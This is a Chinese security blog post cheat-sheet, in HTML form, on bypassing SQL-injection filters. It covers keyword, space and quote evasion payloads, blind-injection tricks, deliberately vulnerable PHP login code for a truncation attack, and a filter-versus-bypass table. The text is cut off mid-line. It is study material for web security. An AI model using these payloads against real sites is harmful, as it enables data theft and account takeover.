@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql注入过滤问题 | su29029的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入过滤问题">
+<meta property="og:url" content="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="su29029的博客">
+<meta property="og:description" content="今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-08-28T02:46:04.000Z">
+<meta property="article:modified_time" content="2020-08-28T05:43:13.954Z">
+<meta property="article:author" content="su29029">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="su29029的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">su29029的博客</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://su29029.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-sql注入过滤问题" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%97%AE%E9%A2%98/" class="article-date">
+  <time datetime="2020-08-28T02:46:04.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>►<a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入过滤问题
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>今天总结一下sql注入过程中目前阶段碰到的主要过滤问题。</p>
+<a id="more"></a>
+<h4 id="0x00-基本问题"><a href="#0x00-基本问题" class="headerlink" title="0x00 基本问题"></a>0x00 基本问题</h4><p>sql注入过程中，为了防止注入，代码中一般会进行输入字符的过滤或拦截。其中过滤指的是输入的内容被删除or替换成了别的字符，拦截指的是检测到指定内容存在后，直接返回错误，不再进行后续的操作。</p>
+<h4 id="0x01-and-or"><a href="#0x01-and-or" class="headerlink" title="0x01 and/or"></a>0x01 and/or</h4><p>1.尝试双写or大小写绕过</p>
+<p>2.运算符代替:<code>&amp;&amp;</code>,<code>||</code></p>
+<p>3.<code>^</code>运算符，例如:?id=1^(1=0) (1^0=1,故返回id=1的数据)</p>
+<p>4.拼接<code>=</code>运算符，例如:?id=1=(1=1) (1=1为真，故返回id=true即id=1的数据(true=1))</p>
+<h4 id="0x02-空格"><a href="#0x02-空格" class="headerlink" title="0x02 空格"></a>0x02 空格</h4><p>1.注释/**/代替</p>
+<p>2.<code>and/or</code>后面可以加偶数个<code>!或~</code>可以替代空格，也可以混合使用</p>
+<p>3.<code>%09, %0a, %0b, %0c, %0d, %a0</code>等部分不可见字符绕过</p>
+<p>4.巧用括号</p>
+<h4 id="0x03-括号"><a href="#0x03-括号" class="headerlink" title="0x03 括号"></a>0x03 括号</h4><p>使用order by进行盲注，例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,&#123;<span class="string">&#x27;1&#x27;</span>&#125; <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> <span class="keyword">limit</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>通过修改大括号中的值，即可进行指定字符串与目标未知字符串的比较，如果大于则位置字符串排在前，如果小于则指定字符串排在前。通过limit来控制显示问题。由此可通过编写脚本进行注入。</p>
+<h4 id="0x04-逗号"><a href="#0x04-逗号" class="headerlink" title="0x04 逗号"></a>0x04 逗号</h4><p>1.盲注</p>
+<p>2.使用join语句。例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于某些字符串处理函数，例如substr，可以通过substr(str from pos for len)的方法以避免使用括号，limit 0,1 可以通过limit 1 offset 1代替。</p>
+<h4 id="0x05-引号"><a href="#0x05-引号" class="headerlink" title="0x05 引号"></a>0x05 引号</h4><p>1.考虑宽字节注入(存在编码问题时)</p>
+<p>2.引号逃逸(当存在两个或以上数据输入时，通过\可以转义一个单引号，随后在下一个输入框or字段中写入注入代码，最后添加注释符，这时可巧妙的避开引号闭合问题)</p>
+<h4 id="0x06-注释"><a href="#0x06-注释" class="headerlink" title="0x06 注释"></a>0x06 注释</h4><p>1.巧妙闭合单引号，例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id&#x3D;&#39;$id&#39;;</span><br><span class="line">注入代码：?id&#x3D;1&#39; union select 1,2,&#39;3</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x07-数字"><a href="#0x07-数字" class="headerlink" title="0x07 数字"></a>0x07 数字</h4><table>
+<thead>
+<tr>
+<th>代替字符</th>
+<th>数</th>
+<th>代替字符</th>
+<th>数</th>
+<th>代替字符</th>
+<th>数</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>false、!pi()</td>
+<td>0</td>
+<td>ceil(pi()*pi())</td>
+<td>10</td>
+<td>A</td>
+<td>ceil((pi()+pi())*pi())</td>
+<td>20</td>
+<td>K</td>
+</tr>
+<tr>
+<td>true、!(!pi())</td>
+<td>1</td>
+<td>ceil(pi()*pi())+true</td>
+<td>11</td>
+<td>B</td>
+<td>ceil(ceil(pi())*version())</td>
+<td>21</td>
+<td>L</td>
+</tr>
+<tr>
+<td>true+true</td>
+<td>2</td>
+<td>ceil(pi()+pi()+version())</td>
+<td>12</td>
+<td>C</td>
+<td>ceil(pi()*ceil(pi()+pi()))</td>
+<td>22</td>
+<td>M</td>
+</tr>
+<tr>
+<td>floor(pi());~~pi()</td>
+<td>3</td>
+<td>floor(pi()*pi()+pi())</td>
+<td>13</td>
+<td>D</td>
+<td>ceil((pi()+ceil(pi()))*pi())</td>
+<td>23</td>
+<td>N</td>
+</tr>
+<tr>
+<td>ceil(pi())</td>
+<td>4</td>
+<td>ceil(pi()*pi()+pi())</td>
+<td>14</td>
+<td>E</td>
+<td>ceil(pi())*ceil(version())</td>
+<td>24</td>
+<td>O</td>
+</tr>
+<tr>
+<td>floor(version()) //注意版本</td>
+<td>5</td>
+<td>ceil(pi()*pi()+version())</td>
+<td>15</td>
+<td>F</td>
+<td>floor(pi()*(version()+pi()))</td>
+<td>25</td>
+<td>P</td>
+</tr>
+<tr>
+<td>ceil(version())</td>
+<td>6</td>
+<td>floor(pi()*version())</td>
+<td>16</td>
+<td>G</td>
+<td>floor(version()*version())</td>
+<td>26</td>
+<td>Q</td>
+</tr>
+<tr>
+<td>ceil(pi()+pi())</td>
+<td>7</td>
+<td>ceil(pi()*version())</td>
+<td>17</td>
+<td>H</td>
+<td>ceil(version()*version())</td>
+<td>27</td>
+<td>R</td>
+</tr>
+<tr>
+<td>floor(version()+pi())</td>
+<td>8</td>
+<td>ceil(pi()*version())+true</td>
+<td>18</td>
+<td>I</td>
+<td>ceil(pi()*pi()*pi()-pi())</td>
+<td>28</td>
+<td>S</td>
+</tr>
+<tr>
+<td>floor(pi()*pi())</td>
+<td>9</td>
+<td>floor((pi()+pi())*pi())</td>
+<td>19</td>
+<td>J</td>
+<td>floor(pi()*pi()*floor(pi()))</td>
+<td>29</td>
+<td>T</td>
+</tr>
+</tbody></table>
+<h4 id="0x08-等于号，大于号，小于号"><a href="#0x08-等于号，大于号，小于号" class="headerlink" title="0x08 等于号，大于号，小于号"></a>0x08 等于号，大于号，小于号</h4><p>等于号可以通过like绕过，大于号小于号主要使用greatest函数，strcmp函数，between and操作符代替。</p>
+<h4 id="0x09-常见函数-符号总结"><a href="#0x09-常见函数-符号总结" class="headerlink" title="0x09 常见函数/符号总结"></a>0x09 常见函数/符号总结</h4><h5 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h5><table>
+<thead>
+<tr>
+<th>单行注释</th>
+<th>单行注释</th>
+<th>单行注释</th>
+<th>多行(内联)注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>#</code></td>
+<td><code>-- x //x为任意字符</code></td>
+<td><code>;%00</code></td>
+<td><code>/*任意内容*/</code></td>
+</tr>
+</tbody></table>
+<h5 id="常用运算符"><a href="#常用运算符" class="headerlink" title="常用运算符"></a>常用运算符</h5><table>
+<thead>
+<tr>
+<th>运算符</th>
+<th>说明</th>
+<th>运算符</th>
+<th>说明</th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&amp;&amp;</td>
+<td>与，同and。</td>
+<td>\</td>
+<td>\</td>
+<td></td>
+<td>或，同or。</td>
+</tr>
+<tr>
+<td>!</td>
+<td>非，同not。</td>
+<td>~</td>
+<td>一元比特反转。</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>^</td>
+<td>异或，同xor。</td>
+<td>+</td>
+<td>加，可替代空格，如<code>select+user()</code>。</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>USER()</td>
+<td>获取当前操作句柄的用户名，同SESSION_USER()、CURRENT_USER()，有时也用SYSTEM_USER()。</td>
+</tr>
+<tr>
+<td>DATABASE()</td>
+<td>获取当前选择的数据库名，同SCHEMA()。</td>
+</tr>
+<tr>
+<td>VERSION()</td>
+<td>获取当前版本信息。</td>
+</tr>
+</tbody></table>
+<h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ORD(str)</td>
+<td>返回字符串第一个字符的ASCII值。</td>
+</tr>
+<tr>
+<td>OCT(N)</td>
+<td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code>。</td>
+</tr>
+<tr>
+<td>HEX(N_S)</td>
+<td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式。</td>
+</tr>
+<tr>
+<td>UNHEX(str)</td>
+<td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符。</td>
+</tr>
+<tr>
+<td>BIN(N)</td>
+<td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式。</td>
+</tr>
+<tr>
+<td>ASCII(str)</td>
+<td>同<code>ORD(string)</code>。</td>
+</tr>
+<tr>
+<td>CONV(N,from_base,to_base)</td>
+<td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回。</td>
+</tr>
+<tr>
+<td>CHAR(N,… [USING charset_name])</td>
+<td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。</td>
+</tr>
+</tbody></table>
+<h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h5><table>
+<thead>
+<tr>
+<th>函数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>SUBSTR(str,N_start,N_length)</td>
+<td>对指定字符串进行截取，为SUBSTRING的简单版。</td>
+</tr>
+<tr>
+<td>SUBSTRING()</td>
+<td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code>。</td>
+</tr>
+<tr>
+<td>RIGHT(str,len)</td>
+<td>对指定字符串从<strong>最右边</strong>截取指定长度。</td>
+</tr>
+<tr>
+<td>LEFT(str,len)</td>
+<td>对指定字符串从<strong>最左边</strong>截取指定长度。</td>
+</tr>
+<tr>
+<td><strong>RPAD(str,len,padstr)</strong></td>
+<td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度。</td>
+</tr>
+<tr>
+<td><strong>LPAD(str,len,padstr)</strong></td>
+<td>与RPAD相似，在<code>str</code>左边补齐。</td>
+</tr>
+<tr>
+<td>MID(str,pos,len)</td>
+<td>同于 <code>SUBSTRING(str,pos,len)</code>。</td>
+</tr>
+<tr>
+<td><strong>INSERT(str,pos,len,newstr)</strong></td>
+<td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数。</td>
+</tr>
+<tr>
+<td>CONCAT(str1,str2…)</td>
+<td>函数用于将多个字符串合并为一个字符串</td>
+</tr>
+<tr>
+<td>GROUP_CONCAT(…)</td>
+<td>返回一个字符串结果，该结果由分组中的值连接组合而成。</td>
+</tr>
+<tr>
+<td><strong>MAKE_SET(bits,str1,str2,…)</strong></td>
+<td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code>。</td>
+</tr>
+</tbody></table>
+<h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table>
+<thead>
+<tr>
+<th>变量</th>
+<th>说明</th>
+<th>变量</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>@@VERSION</td>
+<td>返回版本信息</td>
+<td>@@HOSTNAME</td>
+<td>返回安装的计算机名称</td>
+</tr>
+<tr>
+<td>@@GLOBAL.VERSION</td>
+<td>同<code>@@VERSION</code></td>
+<td>@@BASEDIR</td>
+<td>返回MYSQL绝对路径</td>
+</tr>
+</tbody></table>
+<p>PS：查看全部全局变量<code>SHOW GLOBAL VARIABLES;</code>。</p>
+<h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数/语句"></a>其他常用函数/语句</h5><table>
+<thead>
+<tr>
+<th>函数/语句</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>LENGTH(str)</td>
+<td>返回字符串的长度。</td>
+</tr>
+<tr>
+<td>PI()</td>
+<td>返回π的具体数值。</td>
+</tr>
+<tr>
+<td>REGEXP “statement”</td>
+<td>正则匹配数据，返回值为布尔值。</td>
+</tr>
+<tr>
+<td>LIKE “statement”</td>
+<td>匹配数据，%代表任意内容。返回值为布尔值。</td>
+</tr>
+<tr>
+<td>RLIKE “statement”</td>
+<td>与regexp相同。</td>
+</tr>
+<tr>
+<td>LOCATE(substr,str,[pos])</td>
+<td>返回子字符串第一次出现的位置。</td>
+</tr>
+<tr>
+<td>POSITION(substr IN str)</td>
+<td>等同于 <code>LOCATE()</code>。</td>
+</tr>
+<tr>
+<td>LOWER(str)</td>
+<td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code>。</td>
+</tr>
+<tr>
+<td>UPPER(str)</td>
+<td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code>。</td>
+</tr>
+<tr>
+<td>ELT(N,str1,str2,str3,…)</td>
+<td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值。</td>
+</tr>
+<tr>
+<td>NULLIF(expr1,expr2)</td>
+<td>若expr1与expr2相同，则返回expr1，否则返回NULL。</td>
+</tr>
+<tr>
+<td>CHARSET(str)</td>
+<td>返回字符串使用的字符集。</td>
+</tr>
+<tr>
+<td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td>
+<td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code>。</td>
+</tr>
+</tbody></table>
+<h4 id="0x0a-handler语句代替select-mysql"><a href="#0x0a-handler语句代替select-mysql" class="headerlink" title="0x0a handler语句代替select[mysql]"></a>0x0a handler语句代替select[mysql]</h4><blockquote>
+<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。[故其他数据库不可用]</p>
+</blockquote>
+<p>语法结构：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] <span class="keyword">alias</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> index_name &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> | PREV | <span class="keyword">LAST</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">READ</span> &#123; <span class="keyword">FIRST</span> | <span class="keyword">NEXT</span> &#125;</span><br><span class="line">    [ <span class="keyword">WHERE</span> where_condition ] [<span class="keyword">LIMIT</span> ... ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">HANDLER</span> tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
+
+<p>如：通过handler语句查询users表的内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">handler</span> <span class="keyword">users</span> <span class="keyword">open</span> <span class="keyword">as</span> yunensec; <span class="comment">#指定数据表进行载入并将返回句柄重命名</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">first</span>; <span class="comment">#读取指定表/句柄的首行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">read</span> <span class="keyword">next</span>; <span class="comment">#读取指定表/句柄的下一行数据</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">handler</span> yunensec <span class="keyword">close</span>; <span class="comment">#关闭句柄</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="0x0b-无列名注入"><a href="#0x0b-无列名注入" class="headerlink" title="0x0b 无列名注入"></a>0x0b 无列名注入</h4><p>在不知道列名的情况下，除了使用order by盲注外，还可以直接使用select进行盲注，即select无列名注入。例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`1`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span>) <span class="keyword">as</span> a;</span><br></pre></td></tr></table></figure>
+
+<p>具体可以参考<a target="_blank" rel="noopener" href="https://github.com/su29029/su29029.github.io/blob/master/_posts/2020-6-23-V1lu0%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0hard_sql.md">V1lu0实验室招新hard_sql</a>或<a target="_blank" rel="noopener" href="https://x5tar.com/2019/10/24/cnss-recruit-2019-web/#hard-sql">CNSS 2019招新hard_sql</a>。</p>
+<h4 id="0x0c-其他"><a href="#0x0c-其他" class="headerlink" title="0x0c 其他"></a>0x0c 其他</h4><h5 id="UPDATE注入重复字段赋值"><a href="#UPDATE注入重复字段赋值" class="headerlink" title="UPDATE注入重复字段赋值"></a>UPDATE注入重复字段赋值</h5><p>即：<code>UPDATA table_name set field1=new_value,field1=new_value2 [where子句]</code>，最终field1字段的内容为new_value2，可用这个特性来进行UPDATA注入。如：</p>
+<p><code>UPDATE table_name set field1=new_value,field1=(select user()) [where子句]</code></p>
+<h5 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h5><p>举个例子，假设我们创建了一个数据表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">users</span>(</span><br><span class="line">    username <span class="built_in">varchar</span>(<span class="number">25</span>),</span><br><span class="line">    <span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">25</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>这时候我们进行登录注册的相关代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 注册</span><br><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; addslashes(@$_POST[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; addslashes(@$_POST[&#39;password&#39;]);</span><br><span class="line">$sql1 &#x3D; &quot;select * from users where username &#x3D; &#39;$username&#39;&quot;;</span><br><span class="line">$rs &#x3D; mysqli_query($conn,$sql1);</span><br><span class="line">if($rs-&gt;fetch_row())&#123;</span><br><span class="line">    die(&#39;账号已注册&#39;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $sql2 &#x3D; &quot;insert into users values(&#39;$username&#39;,&#39;$password&#39;)&quot;;</span><br><span class="line">    mysqli_query($conn,$sql2);</span><br><span class="line">    die(&#39;注册成功&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 登录</span><br><span class="line">&lt;?php</span><br><span class="line">$conn &#x3D; mysqli_connect(&quot;127.0.0.1:3306&quot;, &quot;root&quot;, &quot;root&quot;, &quot;db&quot;);</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">$username &#x3D; addslashes(@$_POST[&#39;username&#39;]);</span><br><span class="line">$password &#x3D; addslashes(@$_POST[&#39;password&#39;]);</span><br><span class="line">$sql &#x3D; &quot;select * from users where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;$password&#39;;&quot;;</span><br><span class="line">$rs &#x3D; mysqli_query($conn,$sql);</span><br><span class="line">if($rs-&gt;fetch_row())&#123;</span><br><span class="line">    $_SESSION[&#39;username&#39;]&#x3D;$password;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;fail&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里没有编码问题，也进行了转移操作，由于存在长度限制，故可尝试sql约束攻击。注册名为<code>admin                         1</code>的用户名，密码自定，随后使用admin登录，密码就是刚刚的密码，发现登录成功。(原理，注册时select的时候，超长度的字段不会截取，故检查出未注册，而insert的时候会截取前25个字符，故再进行登录的时候’admin’=’admin                     ‘，从而登录成功)</p>
+<h4 id="0x0c-常见过滤绕过方法"><a href="#0x0c-常见过滤绕过方法" class="headerlink" title="0x0c 常见过滤绕过方法"></a>0x0c 常见过滤绕过方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">过滤关键字    and or</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 or 1&#x3D;1 1 and 1&#x3D;1</span><br><span class="line">绕过方式    1 || 1&#x3D;1 1 &amp;&amp; 1&#x3D;1</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    union select user,password from users</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users where userid&#x3D;1)&#x3D;&#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span class="line"></span><br><span class="line">过滤关键字    and or union where</span><br><span class="line">php代码    preg_match(&#39;&#x2F;(and|or|union|where)&#x2F;i&#39;,$id)</span><br><span class="line">会过滤的攻击代码    1 &amp;&amp; (select user from users where user_id &#x3D; 1) &#x3D; &#39;admin&#39;</span><br><span class="line">绕过方式    1 &amp;&amp; (select user from users limit 1) &#x3D; &#39;admin&#39;</span><br><span 